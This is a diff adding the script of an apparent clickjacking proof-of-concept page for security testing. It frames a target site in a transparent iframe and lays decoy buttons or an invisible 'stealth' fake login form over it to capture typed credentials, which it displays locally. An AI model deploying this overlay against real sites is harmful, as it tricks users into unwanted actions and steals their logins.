+            return {
+                target: params.get('target') || CONFIG.targetUrl || '',
+                name: params.get('name') || CONFIG.targetName || '',
+                scenario: params.get('scenario') || CONFIG.defaultScenario || 'custom',
+                opacity: parseInt(params.get('opacity')) || CONFIG.defaultOpacity || 50,
+                overlayOpacity: parseInt(params.get('overlayOpacity')) || CONFIG.defaultOverlayOpacity || 100,
+                formX: parseInt(params.get('formX')) || CONFIG.formPosition.x || 50,
+                formY: parseInt(params.get('formY')) || CONFIG.formPosition.y || 200,
+                formW: parseInt(params.get('formW')) || CONFIG.formPosition.width || 280,
+                // Field style params
+                fieldH: parseInt(params.get('fieldH')) || CONFIG.fieldStyle.height || 40,
+                fieldFont: parseInt(params.get('fieldFont')) || CONFIG.fieldStyle.fontSize || 14,
+                fieldGap: parseInt(params.get('fieldGap')) || CONFIG.fieldStyle.gap || 10
+            };
+        }
+
+        // ===========================================
+        // Initialize Application
+        // ===========================================
+        function init() {
+            const params = getUrlParams();
+
+            // Set timestamp
+            document.getElementById('timestamp').textContent =
+                new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
+
+            // Set target URL
+            const targetIframe = document.getElementById('targetIframe');
+            const targetDisplay = document.getElementById('targetDisplay');
+
+            if (params.target && params.target.length > 0) {
+                targetIframe.src = params.target;
+                targetDisplay.textContent = params.target;
+            } else {
+                targetDisplay.textContent = '(not configured - set CONFIG.targetUrl or use ?target=)';
+                targetIframe.src = 'about:blank';
+            }
+
+            // Set initial opacity
+            const opacitySlider = document.getElementById('opacitySlider');
+            const opacityValue = document.getElementById('opacityValue');
+            opacitySlider.value = params.opacity;
+            opacityValue.textContent = params.opacity + '%';
+            targetIframe.style.opacity = params.opacity / 100;
+
+            // Set form position from params
+            formPosition = { x: params.formX, y: params.formY, width: params.formW };
+            document.getElementById('formPosX').value = params.formX;
+            document.getElementById('formPosY').value = params.formY;
+            document.getElementById('formWidth').value = params.formW;
+            updateFormPosition();
+
+            // Set overlay opacity from params
+            overlayOpacity = params.overlayOpacity;
+            document.getElementById('overlayOpacitySlider').value = params.overlayOpacity;
+            document.getElementById('overlayOpacityValue').textContent = params.overlayOpacity + '%';
+            updateOverlayOpacity();
+
+            // Set field styles from params
+            document.getElementById('fieldHeight').value = params.fieldH;
+            document.getElementById('fieldFontSize').value = params.fieldFont;
+            document.getElementById('fieldGap').value = params.fieldGap;
+            updateFieldStyles();
+
+            // Initialize stealth colors
+            updateStealthColors();
+
+            // Set initial scenario
+            const scenarioSelect = document.getElementById('scenarioSelect');
+            if (scenarios[params.scenario]) {
+                scenarioSelect.value = params.scenario;
+                applyScenario(params.scenario);
+            }
+
+            // Setup event listeners
+            setupEventListeners();
+
+            // Check iframe load status
+            setupIframeErrorHandling();
+        }
+
+        // ===========================================
+        // Event Listeners Setup
+        // ===========================================
+        function setupEventListeners() {
+            // Opacity slider
+            const opacitySlider = document.getElementById('opacitySlider');
+            const opacityValue = document.getElementById('opacityValue');
+            const targetIframe = document.getElementById('targetIframe');
+
+            opacitySlider.addEventListener('input', (e) => {
+                const value = e.target.value;
+                opacityValue.textContent = value + '%';
+                targetIframe.style.opacity = value / 100;
+            });
+
+            // Scenario selector
+            const scenarioSelect = document.getElementById('scenarioSelect');
+            scenarioSelect.addEventListener('change', (e) => {
+                applyScenario(e.target.value);
+            });
+
+            // View toggle buttons
+            const viewBtns = document.querySelectorAll('.view-btn');
+            viewBtns.forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    viewBtns.forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+
+                    const isVictimView = btn.dataset.view === 'victim';
+                    const targetIframe = document.getElementById('targetIframe');
+                    const credentialOverlay = document.getElementById('credentialOverlay');
+                    const opacitySlider = document.getElementById('opacitySlider');
+                    const overlayOpacitySlider = document.getElementById('overlayOpacitySlider');
+                    const isCredentialMode = document.body.classList.contains('credential-mode');
+
+                    if (isVictimView) {
+                        document.body.classList.add('victim-view');
+                        if (isCredentialMode) {
+                            // Credential mode victim view:
+                            // - Real iframe VISIBLE (100%) - victim sees real login
+                            // - Overlay in STEALTH MODE - invisible fields, visible text
+                            targetIframe.style.opacity = '1';
+                            credentialOverlay.style.opacity = '1';  // Overlay visible (but stealth)
+                            // Auto-enable stealth mode for realistic attack
+                            if (!stealthMode) {
+                                toggleStealthMode();
+                            }
+                        } else {
+                            // Standard clickjacking victim view:
+                            // - Iframe hidden, decoy content visible
+                            targetIframe.style.opacity = '0';
+                        }
+                    } else {
+                        document.body.classList.remove('victim-view');
+                        // Attacker view: restore slider values to see alignment
+                        targetIframe.style.opacity = opacitySlider.value / 100;
+                        if (isCredentialMode) {
+                            credentialOverlay.style.opacity = overlayOpacitySlider.value / 100;
+                            // Disable stealth mode to see overlay for alignment
+                            if (stealthMode) {
+                                toggleStealthMode();
+                            }
+                        }
+                    }
+                });
+            });
+
+            // Click overlay capture
+            const clickOverlay = document.getElementById('clickOverlay');
+            const decoyButton = document.getElementById('decoyButton');
+
+            decoyButton.addEventListener('click', handleOverlayClick);
+            clickOverlay.addEventListener('click', (e) => {
+                if (e.target === clickOverlay) {
+                    handleOverlayClick(e);
+                }
+            });
+
+            // Modal close
+            const modalBackdrop = document.getElementById('modalBackdrop');
+            const modalClose = document.getElementById('modalClose');
+
+            modalClose.addEventListener('click', () => {
+                modalBackdrop.classList.remove('show');
+            });
+
+            modalBackdrop.addEventListener('click', (e) => {
+                if (e.target === modalBackdrop) {
+                    modalBackdrop.classList.remove('show');
+                }
+            });
+
+            // Keyboard support
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape') {
+                    // Close modal first, then exit victim view
+                    if (modalBackdrop.classList.contains('show')) {
+                        modalBackdrop.classList.remove('show');
+                    } else if (document.body.classList.contains('victim-view')) {
+                        exitVictimView();
+                    }
+                }
+                // Arrow key support for positioning (when not in input field)
+                if (document.body.classList.contains('credential-mode') &&
+                    !['INPUT', 'TEXTAREA'].includes(document.activeElement.tagName)) {
+                    switch(e.key) {
+                        case 'ArrowUp': moveOverlay(0, -1); e.preventDefault(); break;
+                        case 'ArrowDown': moveOverlay(0, 1); e.preventDefault(); break;
+                        case 'ArrowLeft': moveOverlay(-1, 0); e.preventDefault(); break;
+                        case 'ArrowRight': moveOverlay(1, 0); e.preventDefault(); break;
+                    }
+                }
+            });
+
+            // Position controls
+            document.getElementById('formPosX').addEventListener('input', updateFormPosition);
+            document.getElementById('formPosY').addEventListener('input', updateFormPosition);
+            document.getElementById('formWidth').addEventListener('input', updateFormPosition);
+
+            // Field style controls
+            document.getElementById('fieldHeight').addEventListener('input', updateFieldStyles);
+            document.getElementById('fieldFontSize').addEventListener('input', updateFieldStyles);
+            document.getElementById('fieldGap').addEventListener('input', updateFieldStyles);
+            document.getElementById('fieldRadius').addEventListener('input', updateFieldStyles);
+            document.getElementById('fieldPadding').addEventListener('input', updateFieldStyles);
+
+            // Iframe size controls
+            document.getElementById('iframeWidth').addEventListener('input', updateIframeSize);
+            document.getElementById('iframeHeight').addEventListener('input', updateIframeSize);
+
+            // Button offset controls
+            document.getElementById('btnOffsetX').addEventListener('input', updateButtonOffset);
+            document.getElementById('btnOffsetY').addEventListener('input', updateButtonOffset);
+
+            // Stealth color controls
+            document.getElementById('stealthBgColor').addEventListener('input', updateStealthColors);
+            document.getElementById('stealthTextColor').addEventListener('input', updateStealthColors);
+
+            // Overlay opacity slider
+            const overlayOpacitySlider = document.getElementById('overlayOpacitySlider');
+            const overlayOpacityValue = document.getElementById('overlayOpacityValue');
+            overlayOpacitySlider.addEventListener('input', (e) => {
+                overlayOpacity = parseInt(e.target.value);
+                overlayOpacityValue.textContent = overlayOpacity + '%';
+                updateOverlayOpacity();
+            });
+
+            // Credential form listeners
+            setupCredentialCapture();
+        }
+
+        // ===========================================
+        // Credential Capture Setup
+        // ===========================================
+        function setupCredentialCapture() {
+            const fakeUsername = document.getElementById('fakeUsername');
+            const fakePassword = document.getElementById('fakePassword');
+            const fakeSubmit = document.getElementById('fakeSubmit');
+            const captureIndicator = document.getElementById('captureIndicator');
+
+            // Live capture on input
+            fakeUsername.addEventListener('input', (e) => {
+                document.getElementById('capturedUsername').textContent = e.target.value || '-';
+                showCaptureIndicator();
+            });
+
+            fakePassword.addEventListener('input', (e) => {
+                document.getElementById('capturedPassword').textContent = e.target.value || '-';
+                showCaptureIndicator();
+            });
+
+            // Show indicator on focus
+            fakeUsername.addEventListener('focus', showCaptureIndicator);
+            fakePassword.addEventListener('focus', showCaptureIndicator);
+
+            // Handle form submission
+            fakeSubmit.addEventListener('click', (e) => {
+                e.preventDefault();
+                handleCredentialCapture();
+            });
+
+            // Also capture on Enter key
+            fakePassword.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleCredentialCapture();
+                }
+            });
+        }
+
+        function showCaptureIndicator() {
+            const indicator = document.getElementById('captureIndicator');
+            indicator.classList.add('show');
+            setTimeout(() => indicator.classList.remove('show'), 1500);
+        }
+
+        function handleCredentialCapture() {
+            const username = document.getElementById('fakeUsername').value;
+            const password = document.getElementById('fakePassword').value;
+
+            // Update modal
+            document.getElementById('modalTitle').textContent = '🔓 Credentials Captured!';
+            document.getElementById('clickCoords').style.display = 'none';
+            document.getElementById('credentialDisplay').style.display = 'block';
+            document.getElementById('modalUsername').textContent = username || '(empty)';
+            document.getElementById('modalPassword').textContent = password || '(empty)';
+            document.getElementById('modalMessage').textContent =
+                'The victim entered their credentials into a fake form controlled by the attacker.';
+            document.getElementById('warningText').style.display = 'block';
+
+            // Create flash effect
+            const rect = document.getElementById('fakeSubmit').getBoundingClientRect();
+            createClickFlash(rect.left + rect.width/2, rect.top + rect.height/2);
+
+            // Show modal
+            document.getElementById('modalBackdrop').classList.add('show');
+        }
+
+        // ===========================================
+        // Form Position & Style Controls
+        // ===========================================
+        let overlayOpacity = 100; // Overlay opacity (0-100)
+        const MOVE_STEP = 5; // Pixels to move per arrow click
+
+        // Field style state
+        let fieldStyle = {
+            height: 40,
+            fontSize: 14,
+            gap: 10
+        };
+
+        function updateFormPosition() {
+            formPosition.x = parseInt(document.getElementById('formPosX').value) || 0;
+            formPosition.y = parseInt(document.getElementById('formPosY').value) || 0;
+            formPosition.width = parseInt(document.getElementById('formWidth').value) || 200;
+
+            const overlay = document.getElementById('credentialOverlay');
+            overlay.style.left = formPosition.x + 'px';
+            overlay.style.top = formPosition.y + 'px';
+            overlay.style.width = formPosition.width + 'px';
+        }
+
+        function updateOverlayOpacity() {
+            const overlay = document.getElementById('credentialOverlay');
+            overlay.style.opacity = overlayOpacity / 100;
+        }
+
+        function updateFieldStyles() {
+            fieldStyle.height = parseInt(document.getElementById('fieldHeight').value) || 40;
+            fieldStyle.fontSize = parseInt(document.getElementById('fieldFontSize').value) || 14;
+            fieldStyle.gap = parseInt(document.getElementById('fieldGap').value) || 10;
+            const radius = parseInt(document.getElementById('fieldRadius').value) || 4;
+            const padding = parseInt(document.getElementById('fieldPadding').value) || 15;
+
+            const fakeUsername = document.getElementById('fakeUsername');
+            const fakePassword = document.getElementById('fakePassword');
+            const fakeSubmit = document.getElementById('fakeSubmit');
+            const formGroups = document.querySelectorAll('.fake-login-form .form-group');
+
+            // Apply height, font size, radius, and padding to inputs
+            [fakeUsername, fakePassword].forEach(input => {
+                input.style.height = fieldStyle.height + 'px';
+                input.style.fontSize = fieldStyle.fontSize + 'px';
+                input.style.padding = '0 ' + padding + 'px';
+                input.style.lineHeight = fieldStyle.height + 'px';
+                input.style.borderRadius = radius + 'px';
+            });
+
+            // Apply to submit button
+            fakeSubmit.style.height = fieldStyle.height + 'px';
+            fakeSubmit.style.fontSize = fieldStyle.fontSize + 'px';
+            fakeSubmit.style.lineHeight = fieldStyle.height + 'px';
+            fakeSubmit.style.padding = '0 ' + padding + 'px';
+            fakeSubmit.style.borderRadius = radius + 'px';
+
+            // Apply gap between form groups
+            formGroups.forEach(group => {
+                group.style.marginBottom = fieldStyle.gap + 'px';
+            });
+        }
+
+        function updateIframeSize() {
+            const width = parseInt(document.getElementById('iframeWidth').value) || 900;
+            const height = parseInt(document.getElementById('iframeHeight').value) || 650;
+            const iframe = document.getElementById('targetIframe');
+            const wrapper = document.getElementById('demoWrapper');
+
+            iframe.style.width = width + 'px';
+            iframe.style.height = height + 'px';
+            iframe.width = width;
+            iframe.height = height;
+        }
+
+        function updateStealthColors() {
+            const bgColor = document.getElementById('stealthBgColor').value;
+            const textColor = document.getElementById('stealthTextColor').value;
+            const overlay = document.getElementById('credentialOverlay');
+
+            // Set CSS custom properties for stealth mode colors
+            overlay.style.setProperty('--stealth-bg', bgColor);
+            overlay.style.setProperty('--stealth-text', textColor);
+        }
+
+        function updateButtonOffset() {
+            const offsetX = parseInt(document.getElementById('btnOffsetX').value) || 0;
+            const offsetY = parseInt(document.getElementById('btnOffsetY').value) || 0;
+            const fakeSubmit = document.getElementById('fakeSubmit');
+
+            // Apply offset using transform (relative to normal position)
+            fakeSubmit.style.position = 'relative';
+            fakeSubmit.style.left = offsetX + 'px';
+            fakeSubmit.style.top = offsetY + 'px';
+        }
+
+        // Arrow pad movement (dx, dy in steps, 0,0 = reset to center)
+        function moveOverlay(dx, dy) {
+            if (dx === 0 && dy === 0) {
+                // Reset/center button - snap to current preset
+                applyPreset('center');
+                return;
+            }
+
+            formPosition.x += dx * MOVE_STEP;
+            formPosition.y += dy * MOVE_STEP;
+
+            // Clamp to bounds
+            formPosition.x = Math.max(0, Math.min(900, formPosition.x));
+            formPosition.y = Math.max(0, Math.min(700, formPosition.y));
+
+            document.getElementById('formPosX').value = Math.round(formPosition.x);
+            document.getElementById('formPosY').value = Math.round(formPosition.y);
+            updateFormPosition();
+        }
+
+        function applyPreset(preset) {
+            const wrapper = document.getElementById('demoWrapper');
+            const width = wrapper.offsetWidth || 900;
+            const height = wrapper.offsetHeight || 650;
+
+            switch(preset) {
+                case 'center':
+                    formPosition = { x: (width - 280) / 2, y: (height - 150) / 2, width: 280 };
+                    break;
+                case 'default':
+                    // Default preset for common login form position
+                    formPosition = { x: 50, y: 245, width: 280 };
+                    break;
+            }
+
+            document.getElementById('formPosX').value = Math.round(formPosition.x);
+            document.getElementById('formPosY').value = Math.round(formPosition.y);
+            document.getElementById('formWidth').value = formPosition.width;
+            updateFormPosition();
+        }
+
+        // ===========================================
+        // Stealth Mode Toggle
+        // ===========================================
+        let stealthMode = false;
+
+        function toggleStealthMode() {
+            stealthMode = !stealthMode;
+            const credentialOverlay = document.getElementById('credentialOverlay');
+            const stealthToggle = document.getElementById('stealthToggle');
+
+            if (stealthMode) {
+                credentialOverlay.classList.add('stealth-mode');
+                stealthToggle.classList.add('active');
+                stealthToggle.textContent = 'Stealth: ON';
+            } else {
+                credentialOverlay.classList.remove('stealth-mode');
+                stealthToggle.classList.remove('active');
+                stealthToggle.textContent = 'Stealth: OFF';
+            }
+        }
+
+        // ===========================================
+        // Exit Victim View
+        // ===========================================
+        function exitVictimView() {
+            const attackerBtn = document.querySelector('.view-btn[data-view="attacker"]');
+            if (attackerBtn) {
+                attackerBtn.click();  // Trigger the attacker view button
+            }
+        }
+
+        // ===========================================
+        // Apply Scenario
+        // ===========================================
+        function applyScenario(scenarioKey) {
+            const scenario = scenarios[scenarioKey];
+            if (!scenario) return;
+
+            const overlay = document.getElementById('clickOverlay');
+            const overlayContent = overlay.querySelector('.overlay-content');
+            const credentialOverlay = document.getElementById('credentialOverlay');
+            const positionPanel = document.getElementById('positionPanel');
+            const liveCapture = document.getElementById('liveCapture');
+            const severityBadge = document.getElementById('severityBadge');
+
+            // Toggle credential mode
+            if (scenario.isCredential) {
+                document.body.classList.add('credential-mode');
+                credentialOverlay.classList.add('show');
+                positionPanel.classList.add('show');
+                liveCapture.classList.add('show');
+
+                // Reset form values
+                document.getElementById('fakeUsername').value = '';
+                document.getElementById('fakePassword').value = '';
+                document.getElementById('capturedUsername').textContent = '-';
+                document.getElementById('capturedPassword').textContent = '-';
+            } else {
+                document.body.classList.remove('credential-mode');
+                credentialOverlay.classList.remove('show');
+                positionPanel.classList.remove('show');
+                liveCapture.classList.remove('show');
+            }
+
+            // Update severity badge
+            document.getElementById('severityLevel').textContent = scenario.severity.level;
+            document.getElementById('severityCvss').textContent = scenario.severity.cvss;
+
+            // Remove all theme classes
+            Object.values(scenarios).forEach(s => {
+                if (s.theme) {
+                    overlayContent.classList.remove(s.theme);
+                }
+            });
+
+            // Apply new theme
+            if (scenario.theme) {
+                overlayContent.classList.add(scenario.theme);
+            }
+
+            // Update content
+            document.getElementById('overlayTitle').textContent = scenario.title;
+            document.getElementById('overlayMessage').textContent = scenario.message;
+            document.getElementById('decoyButton').textContent = scenario.buttonText;
+            document.getElementById('actionText').textContent = scenario.action;
+
+            // Reset modal for standard scenarios
+            document.getElementById('modalTitle').textContent = '⚠️ Click Captured!';
+            document.getElementById('clickCoords').style.display = 'block';
+            document.getElementById('credentialDisplay').style.display = 'none';
+            document.getElementById('warningText').style.display = 'none';
+            document.getElementById('modalMessage').textContent =
+                'This click would have triggered an action on the embedded website.';
+        }
+
+        // ===========================================
+        // Click Handler
+        // ===========================================
+        function handleOverlayClick(e) {
+            const rect = document.getElementById('demoWrapper').getBoundingClientRect();
+            const x = Math.round(e.clientX - rect.left);
+            const y = Math.round(e.clientY - rect.top);
+
+            // Create flash effect
+            createClickFlash(e.clientX, e.clientY);
+
+            // Update modal with coordinates
+            document.getElementById('clickCoords').textContent =
+                `Click Position: X: ${x}, Y: ${y}`;
+
+            // Show modal
+            document.getElementById('modalBackdrop').classList.add('show');
+        }
+
+        // ===========================================
+        // Click Flash Effect
+        // ===========================================
+        function createClickFlash(x, y) {
+            const flash = document.createElement('div');
+            flash.className = 'click-flash';
+            flash.style.left = x + 'px';
+            flash.style.top = y + 'px';
+            document.body.appendChild(flash);
+
+            setTimeout(() => {
+                flash.remove();
+            }, 500);
+        }
+
+        // ===========================================
+        // Iframe Error Handling
+        // ===========================================
+        function setupIframeErrorHandling() {
+            const iframe = document.getElementById('targetIframe');
+            const errorDiv = document.getElementById('iframeError');
+
+            // Note: Due to same-origin policy, we can't directly detect X-Frame-Options errors
+            // This is a best-effort detection using load event timing
+            let loadTimeout;
+
+            iframe.addEventListener('load', () => {
+                clearTimeout(loadTimeout);
+                // Iframe loaded successfully - hide error
+                errorDiv.classList.remove('show');
+            });
+
+            iframe.addEventListener('error', () => {
+                errorDiv.classList.add('show');
+            });
+        }
+
+        // ===========================================
+        // Initialize on DOM Ready
+        // ===========================================
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
 </html>
